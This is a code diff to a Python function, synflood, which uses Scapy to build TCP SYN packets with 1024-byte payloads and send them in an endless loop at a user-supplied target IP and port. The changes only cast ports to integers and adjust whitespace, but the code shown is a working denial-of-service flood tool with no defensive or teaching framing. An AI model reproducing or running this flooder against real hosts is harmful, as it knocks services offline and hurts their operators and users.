@@ -12,22 +12,22 @@ def synflood(source_port, target_ip, target_port):
     
     try:
         if source_port.lower() == 'r':
-            source_port = RandShort()
+            source_port = int(RandShort())
         else:
             source_port = int(source_port)
 
         choice = input(f'[{Fore.GREEN}+{Style.RESET_ALL}] Source port: {Fore.GREEN}{source_port}{Style.RESET_ALL}\n[{Fore.GREEN}+{Style.RESET_ALL}] Target IP: {Fore.GREEN}{target_ip}{Style.RESET_ALL}\n[{Fore.GREEN}+{Style.RESET_ALL}] Target port: {Fore.GREEN}{target_port}{Style.RESET_ALL}\nDo you wish to continue? [Y/N]: ')
 
         if choice.lower() == 'y':
+
             i=0
-
             ip = IP(dst=target_ip) ####
-            tcp = TCP(sport=source_port, dport=target_port, flags="S")
-
+            tcp = TCP(sport=source_port, dport=int(target_port), flags="S")
             raw = Raw(b"X"*1024)
             p = ip / tcp / raw
 
             print(f'[{Fore.YELLOW}?{Style.RESET_ALL}] Sending packets to {Fore.YELLOW}{target_ip}{Style.RESET_ALL} on port {Fore.YELLOW}{target_port}{Style.RESET_ALL}...')
+            
             send(p, loop=1, verbose=0)
 
         else:
